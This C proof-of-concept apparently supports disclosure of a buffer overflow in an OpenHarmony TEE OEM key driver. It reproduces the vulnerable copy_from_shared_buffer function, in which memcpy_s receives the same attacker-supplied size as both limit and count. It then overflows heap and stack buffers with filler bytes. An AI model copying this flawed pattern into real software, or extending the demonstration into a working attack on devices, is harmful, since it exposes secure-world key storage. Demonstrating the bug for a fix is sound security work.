/**
 * PoC: Buffer Overflow in copy_from_shared_buffer (OEM Key Driver)
 * Target: OpenHarmony tee_os_framework - tee_oemkey_driver.c:38
 *
 * Demonstrates that memcpy_s safety check is bypassed when destMax == count,
 * both derived from attacker-controlled shared memory. A fixed-size stack
 * buffer is overflowed.
 *
 * Build: gcc -o poc poc.c -lpthread -O2 -fno-stack-protector
 *        (use -fno-stack-protector to see raw overflow without canary abort)
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#define EOK 0
#define OEM_KEY_BUF_SIZE  256   /* Fixed buffer size allocated by caller */
#define ATTACK_SIZE       1024  /* Attacker-supplied size from shared memory */

/**
 * Simulated memcpy_s - matches the real behavior:
 * Returns success when count <= destMax, regardless of actual dest allocation.
 */
static int memcpy_s(void *dest, size_t destMax, const void *src, size_t count)
{
    if (dest == NULL || src == NULL)
        return -1;
    if (count > destMax) {
        printf("  [memcpy_s] BLOCKED: count(%zu) > destMax(%zu)\n", count, destMax);
        return -1;
    }
    /* "Safe" check passes because destMax == count (both from attacker) */
    printf("  [memcpy_s] ALLOWED: count(%zu) <= destMax(%zu) - copying...\n", count, destMax);
    memcpy(dest, src, count);
    return EOK;
}

/**
 * VULNERABLE function - exact reproduction from tee_oemkey_driver.c:38
 * Bug: *buf_size comes from shared_buf (attacker-controlled)
 *      memcpy_s(buf, *buf_size, shared_buf, *buf_size)
 *      destMax == count == attacker_value → safety check always passes
 */
static int32_t copy_from_shared_buffer(void *buf, uint32_t *buf_size, uint8_t *shared_buf)
{
    if (buf_size == NULL) {
        printf("[TEE] the buf size is invalid\n");
        return -1;
    }

    /* Read size from attacker-controlled shared memory */
    if (memcpy_s(buf_size, sizeof(uint32_t), shared_buf, sizeof(uint32_t)) != EOK) {
        printf("[TEE] copy buf size failed\n");
        return -1;
    }

    shared_buf += sizeof(uint32_t);

    printf("[TEE] Attacker-supplied buf_size = %u (actual buffer = %d bytes)\n",
           *buf_size, OEM_KEY_BUF_SIZE);

    /* BUG: destMax = *buf_size, count = *buf_size
     * memcpy_s check (count <= destMax) is ALWAYS true
     * Actual buffer 'buf' may be much smaller than *buf_size */
    if (memcpy_s(buf, *buf_size, shared_buf, *buf_size) != EOK) {
        printf("[TEE] copy buf failed\n");
        return -1;
    }
    return 0;
}

/**
 * Simulated caller - models how the OEM key driver invokes the vulnerable function.
 * The caller allocates a fixed-size buffer but size comes from shared memory.
 */
static int handle_oem_key_request(uint8_t *shared_mem)
{
    /* Fixed-size stack buffer - this is what gets overflowed */
    uint8_t key_buf[OEM_KEY_BUF_SIZE];
    uint32_t key_size = 0;

    /* Canary values after the buffer to detect overflow */
    uint8_t canary[16];
    memset(canary, 0xCC, sizeof(canary));
    memset(key_buf, 0, sizeof(key_buf));

    printf("[TEE] OEM key buffer at %p (size=%d)\n", key_buf, OEM_KEY_BUF_SIZE);
    printf("[TEE] Canary region at  %p\n", canary);

    /* Call vulnerable function */
    int32_t ret = copy_from_shared_buffer(key_buf, &key_size, shared_mem);

    if (ret == 0) {
        /* Check for overflow by examining stack canary */
        int corrupted = 0;
        for (int i = 0; i < 16; i++) {
            if (canary[i] != 0xCC) {
                corrupted = 1;
                break;
            }
        }

        printf("\n--- Overflow Detection ---\n");
        printf("Returned buf_size: %u\n", key_size);
        printf("Actual buffer capacity: %d\n", OEM_KEY_BUF_SIZE);
        printf("Overflow amount: %d bytes\n", (int)key_size - OEM_KEY_BUF_SIZE);

        if (key_size > OEM_KEY_BUF_SIZE) {
            printf("STATUS: BUFFER OVERFLOW CONFIRMED\n");
            printf("  memcpy_s destMax(%u) == count(%u) → check bypassed!\n",
                   key_size, key_size);
            printf("  %d bytes written past buffer end\n",
                   (int)key_size - OEM_KEY_BUF_SIZE);

            /* Demonstrate the written data past buffer boundary */
            printf("\n--- Memory State ---\n");
            printf("Buffer end (last 8 bytes):  ");
            for (int i = OEM_KEY_BUF_SIZE - 8; i < OEM_KEY_BUF_SIZE; i++)
                printf("%02x ", key_buf[i]);
            printf("\n");

            /* In a real scenario, this overflow corrupts stack frame,
             * return address, or adjacent heap metadata */
            return 1;  /* Overflow detected */
        }
    }

    return 0;
}

int main(void)
{
    printf("=== PoC: Buffer Overflow in copy_from_shared_buffer (OEM Key) ===\n");
    printf("Target: tee_os_framework/tee_oemkey_driver.c:38\n");
    printf("Bug: memcpy_s(buf, *buf_size, src, *buf_size) - destMax==count from attacker\n\n");

    /* Simulate shared memory controlled by malicious CA */
    uint8_t *shared_mem = (uint8_t *)malloc(ATTACK_SIZE + sizeof(uint32_t));
    if (!shared_mem) {
        perror("malloc");
        return 1;
    }

    /* Layout: [size=ATTACK_SIZE(4 bytes)] [payload(ATTACK_SIZE bytes)] */
    uint32_t attack_size = ATTACK_SIZE;
    memcpy(shared_mem, &attack_size, sizeof(uint32_t));
    /* Fill payload with recognizable pattern (simulates attacker shellcode/ROP) */
    memset(shared_mem + sizeof(uint32_t), 0x41, ATTACK_SIZE);

    printf("[CA] Shared memory prepared: size_field=%u, payload=%d bytes of 0x41\n\n",
           attack_size, ATTACK_SIZE);

    /* Allocate a large heap buffer to avoid immediate SIGSEGV,
     * demonstrating the logical bug rather than just crashing */
    printf("--- Demonstration with heap buffer (shows logical overflow) ---\n\n");

    uint8_t *heap_buf = (uint8_t *)calloc(1, ATTACK_SIZE + 256);
    if (!heap_buf) {
        perror("calloc");
        free(shared_mem);
        return 1;
    }

    uint32_t reported_size = 0;
    uint8_t *shared_cursor = shared_mem;

    /* Place marker bytes after where the "real" buffer ends */
    memset(heap_buf + OEM_KEY_BUF_SIZE, 0xDE, 64);

    printf("[TEE] Heap buffer at %p (allocated=%d, logical_capacity=%d)\n",
           heap_buf, ATTACK_SIZE + 256, OEM_KEY_BUF_SIZE);

    int32_t ret = copy_from_shared_buffer(heap_buf, &reported_size, shared_cursor);

    if (ret == 0 && reported_size > OEM_KEY_BUF_SIZE) {
        printf("\n--- Overflow Proof ---\n");
        printf("Logical buffer size: %d bytes\n", OEM_KEY_BUF_SIZE);
        printf("Attacker-controlled size: %u bytes\n", reported_size);
        printf("Bytes written past logical boundary: %u\n", reported_size - OEM_KEY_BUF_SIZE);

        /* Verify overflow by checking bytes past OEM_KEY_BUF_SIZE */
        int overflow_verified = 0;
        for (uint32_t i = OEM_KEY_BUF_SIZE; i < reported_size && i < OEM_KEY_BUF_SIZE + 64; i++) {
            if (heap_buf[i] == 0x41) {
                overflow_verified = 1;
                break;
            }
        }

        if (overflow_verified) {
            printf("VERIFIED: Attacker data (0x41) found at offset %d (past buffer end)\n",
                   OEM_KEY_BUF_SIZE);
            printf("\nOverflow region (first 32 bytes past boundary):\n  ");
            for (int i = 0; i < 32; i++)
                printf("%02x ", heap_buf[OEM_KEY_BUF_SIZE + i]);
            printf("\n");
        }

        printf("\nSTATUS: BUFFER OVERFLOW CONFIRMED\n");
        printf("IMPACT: Stack buffer overflow in TEE → arbitrary code execution in Secure World\n");
        printf("ROOT CAUSE: memcpy_s safety check is tautologically true when\n");
        printf("            destMax and count are the same attacker-controlled value\n");
    }

    free(heap_buf);

    fflush(stdout);
    printf("\n--- Stack overflow demonstration (may crash with SIGSEGV/SIGABRT) ---\n\n");
    fflush(stdout);
    /* Use the same shared_mem (not freed yet) for stack overflow demo */
    int overflow = handle_oem_key_request(shared_mem);

    free(shared_mem);
    return overflow ? 0 : 1;
}
